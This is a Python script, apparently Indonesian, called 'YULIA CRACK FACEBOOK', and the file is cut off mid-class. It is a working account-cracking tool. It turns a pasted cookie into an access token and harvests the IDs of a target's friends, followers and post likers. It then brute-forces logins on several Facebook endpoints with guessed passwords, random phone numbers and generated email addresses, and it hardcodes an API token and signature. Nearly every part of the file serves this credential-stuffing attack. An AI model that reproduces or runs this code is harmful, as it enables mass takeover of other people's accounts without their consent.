#!/usr/bin/python3
# coding=utf-8

#################################
#   ❤ YULIA CRACK FACEBOOK ❤  #
#  Di buat oleh Yulia Cantik ❤ #
#################################

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
from random import randint
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # PUTIH
m = "\x1b[0;31m" # MERAH
h = "\x1b[0;32m" # HIJAU
k = "\x1b[0;33m" # KUNING
b = "\x1b[0;34m" # BIRU
u = "\x1b[0;35m" # UNGU
o = "\x1b[0;36m" # BIRUMUDA
n = "\x1b[0m"    # WARNA MATI

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""\n\x1b[0;32m
╔╗──╔╦╗─╔╦╗──╔══╦═══╗╔╗─╔╦╗──╔═══╦═══╗
║╚╗╔╝║║─║║║──╚╣╠╣╔═╗║║║─║║║──║╔══╣╔═╗║
╚╗╚╝╔╣║─║║║───║║║║─║║║║─║║║──║╚══╣║─║║
 ╚╗╔╝║║─║║║─╔╗║║║╚═╝║║║─║║║─╔╣╔══╣╚═╝║
──║║─║╚═╝║╚═╝╠╣╠╣╔═╗║║╚═╝║╚═╝║║──║╔═╗║
──╚╝─╚═══╩═══╩══╩╝─╚╝╚═══╩═══╩╝──╚╝─╚╝""")

    print ("""\x1b[0;37m────────────────────────────────────────────────────
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Author   : Yulia Ulfa
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Github   : https://github.com/Yuliaulfa
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Facebook : https://www.facebook.com/Yuliaulfax
\x1b[0;37m────────────────────────────────────────────────────""") 

### UA GAK GUNA JELEK ###
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

freefacebook = "https://free.facebook.com"

kon = str(datetime.now().strftime("%d-%m-%Y"))
tol = current.year
bu = current.month
rut = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

def cangcut(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=wkwkga(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=wkwkga())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=wkwkga(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit(p+" ["+h+"•"+p+"] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:asup_goblog()
	else:asup_goblog()

def wkwkga():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
    
### LOGIN METHODE ###

def asup_goblog():
  os.system("clear")
  banner()
  print ("")
  print((p+" ["+h+"01"+p+"] Login Token"))
  print((p+" ["+h+"02"+p+"] Login Cookies"))
  print((p+" ["+h+"00"+p+"] Exit\n"))
  ewe=input(p+" ["+h+"•"+p+"] Pilih: ")
  if ewe=="":
    print((p+" ["+h+"•"+p+"] Fill In The Correct"))
    asup_goblog()
  elif ewe=="1" or ewe=="01":
    ewemunding()
  elif ewe=="2" or ewe=="02":
    gen()
  elif ewe=="0" or ewe=="00":
    exit()
  else:
    print((p+" ["+h+"•"+p+"] Fill In The Correct"))
    asup_goblog()

### LOGIN TOKEN METHOD ###

def ewemunding():
    os.system("clear")
    banner()
    ewehayam = input(p+"\n ["+h+"•"+p+"] Token: ")
    try:
        lempang = requests.get("https://graph.facebook.com/me?access_token=" + ewehayam)
        a = json.loads(lempang.text)
        nama = a["name"]
        asup = open("login.txt", "w")
        asup.write(ewehayam)
        asup.close()
        print((p+" ["+h+"•"+p+"] Login Berhasil!"))
        cangcut((p+" ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
        os.system('xdg-open https://youtube.com/channel/UCSJDs-6vbcEv_twPYbUAdaA')
        menu()
    except KeyError:
        print((p+"\n ["+h+"•"+p+"] Token Invalid"))
        os.system("clear")
        asup_goblog()

def gen():
        os.system("clear")
        banner()
        cookie = input(p+"\n ["+h+"•"+p+"]"+p+" Cookies: ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", #UA
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n * Cookie Invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((p+"\n ["+h+"•"+p+"] No Connection"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((p+"\n ["+h+"•"+p+"] Login Berhasil!"))
        cangcut((p+" ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
        os.system('xdg-open https://youtube.com/channel/UCSJDs-6vbcEv_twPYbUAdaA')
        menu()

### MAIN MENU ###

def menu():
    global ua
    try:
        ewehayam = open("login.txt","r").read()
        lempang = requests.get("https://graph.facebook.com/me/?access_token="+ewehayam)
        a = json.loads(lempang.text)
        nama = a["first_name"]
        ttl = a["birthday"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+h+"•"+p+" Error : %s"%e))
        asup_goblog()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((h+"\n ["+p+" Welcome User \033[1;32m"+nama+h+" ]"+p))
    print((p+" ["+h+"•"+p+"]"+p+" Your ID      : \033[1;32m"+id))
    print((p+" ["+h+"•"+p+"]"+p+" Your TTL     : \033[1;32m"+ttl))
    print((p+" ["+h+"•"+p+"]"+p+" Your Joined  : \033[1;32m"+kon))
    print((p+"\n ["+h+"01"+p+"]"+p+" Crack ID From Public/Friendlist"))
    print((p+" ["+h+"02"+p+"]"+p+" Crack ID From Likers Post"))
    print((p+" ["+h+"03"+p+"]"+p+" Crack ID From Followers"))
    print((p+" ["+h+"04"+p+"]"+p+" Crack Phone Number"))
    print((p+" ["+h+"05"+p+"]"+p+" Crack Email"))
    print((p+" ["+h+"06"+p+"]"+p+" Result Crack"))
    print((p+" ["+h+"00"+p+"]"+p+" Logout "))
    Pilih_menu()

def Pilih_menu():
	r=input(p+"\n ["+h+"•"+p+"] Pilih: ")
	if r=="":
		print((p+" ["+h+"•"+p+"] Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		ngokop()
	elif r=="2" or r=="02":
		sukangentot()
	elif r=="3" or r=="03":
		follow()
	elif r=="4" or r=="04":
		togel()
	elif r=="5" or r=="05":
		ngocokbang()
	elif r=="6" or r=="06":
	    ress()
	elif r=="0" or r=="00":
		try:
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+" ["+h+"•"+p+"] Error %s"%e))
	else:
		print((p+"\n ["+h+"•"+p+"] Wrong Input"))
		menu()	

def ewesoang(file):
  print("\n [ Select Methode Crack ]\n")
  print((p+" ["+h+"01"+p+"] Crack With Api.Facebook"))
  print((p+" ["+h+"02"+p+"] Crack With Api.Facebook + TTL "))
  print((p+" ["+h+"03"+p+"] Crack With Mbasic.Facebook"))
  print((p+" ["+h+"04"+p+"] Crack With Mbasic.Facebook + TTL"))
  print((p+" ["+h+"05"+p+"] Crack With Touch.Facebook"))
  print((p+" ["+h+"06"+p+"] Crack With Touch.Facebook + TTL "))
  print((p+" ["+h+"07"+p+"] Crack With M.Facebook "))
  print((p+" ["+h+"08"+p+"] Crack With M.Facebook + TTL "))
  print((p+" ["+h+"09"+p+"] Crack With Free.Facebook "))
  print((p+" ["+h+"10"+p+"] Crack With Free.Facebook + TTL "))
  print((p+" ["+h+"00"+p+"] Back To Menu "))
  entod=input(p+"\n ["+h+"•"+p+"] Pilih : ")
  if entod in[""]:
    print((p+" ["+h+"•"+p+"] Fill In The Correct"))
    ewesoang(file)
  elif entod in["1","01"]:
    pepeklu(file)
  elif entod in["2","02"]:
    pepekluttl(file)
  elif entod in["3","03"]:
    crack(file)
  elif entod in["4","04"]:
    tinapoe(file)
  elif entod in["5","05"]:
    hasem(file)
  elif entod in["6","06"]:
    hasemttl(file)
  elif entod in["7","07"]:
    hengker(file)
  elif entod in["8","08"]:
    hengkerttl(file)
  elif entod in["9","09"]:
    ngamodal_ajg(file)
  elif entod in["10"]:
    ngamodal_ajgttl(file)
  elif entod in["0","00"]:
    menu()
  else:
    print((p+" ["+h+"•"+p+"]  Fill In The Correct"))
    ewesoang(file)

### DUMP ID ###

def ngokop():
	try:
		ewehayam=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+h+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		asup_goblog()
	try:
		print((p+"\n ["+h+"•"+p+"] Type \'me\' Dump From Friendlist"))
		idt = input(p+" ["+h+"•"+p+"] User ID Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+ewehayam)
			op = json.loads(jok.text)
			print((p+" ["+h+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+h+"•"+p+"] ID Not Found"))
			print((p+"\n [Back]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+ewehayam)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+h+"•"+p+"] Total ID : %s"%(len(id))))
		return ewesoang(qq)
	except Exception as e:
		exit(p+"\n ["+h+"•"+p+"] Error : %s"%e)

def sukangentot():
	try:
		ewehayam=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+h+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		asup_goblog()
	try:
		idt = input(p+" ["+h+"•"+p+"] ID Post Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+ewehayam)
			op = json.loads(jok.text)
			print((p+" ["+h+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+h+"•"+p+"] ID Not Found"))
			print((p+"\n [Back]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+ewehayam)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+h+"•"+p+"] Total ID : %s"%(len(id))))
		return ewesoang(qq)
	except Exception as e:
		exit(p+"\n ["+h+"•"+p+"] Error : %s"%e)

def follow():
	try:
		ewehayam=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+h+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		asup_goblog()
	try:
		idt = input(p+" ["+h+"•"+p+"] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+ewehayam)
			op = json.loads(jok.text)
			print((p+" ["+h+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+h+"•"+p+"] ID Not Found"))
			print((p+"\n [Back]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+ewehayam)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+h+"•"+p+"] Total ID : %s"%(len(id))))
		return ewesoang(qq)
	except Exception as e:
		exit(p+"\n ["+h+"•"+p+"] Error : %s"%e)

### CRACK TOGEL ###

def togel():
  data = []
  print((p+"\n ["+h+"•"+p+"] Number Must Be 5 Digit"))
  kode=str(input(p+" ["+h+"•"+p+"] Example : 92037\n"+p+" ["+h+"•"+p+"] Input Number: "))
  exit((p+"\n ["+h+"•"+p+"] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+h+"•"+p+"] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+h+"•"+p+"] Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+h+"•"+p+"] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(burut, user['user'], user['pw']): user for user in data}
  input(p+"\n [Back]"+p)
  menu()

def ngocokbang():
  data = []
  nama=input(p+" ["+h+"•"+p+"] Target Name : ")
  domain=input(p+" ["+h+"•"+p+"] Pilih Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+h+"•"+p+"] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+" ["+h+"•"+p+"] Amount : "))
  setpw=input(p+" ["+h+"•"+p+"] Set Password : ").split(',')
  print("\033[1;37m ["+h+"•"+p+"] Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(burut, user['user'], user['pw']): user for user in data}
  input("\n\033[1;37m [Back]")
  menu()

def burut(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(user), str(pw)))
        break
  except: pass


### PASSWORD ###

def siagoblog(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i+"123456")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i+"123456")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("anjing")
					results.append("bismillah")
					results.append("assalamualaikum")
					results.append("katasandi")
					results.append("rahasia")
					results.append("kontol")
					results.append("majalengka")
					results.append("123456")
	return results

### MODULE CRACK ###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def ttll(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def f_fb(em,pas,hosts):
	global ua
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb

def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb

### BRUTE CRACK ###
	
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
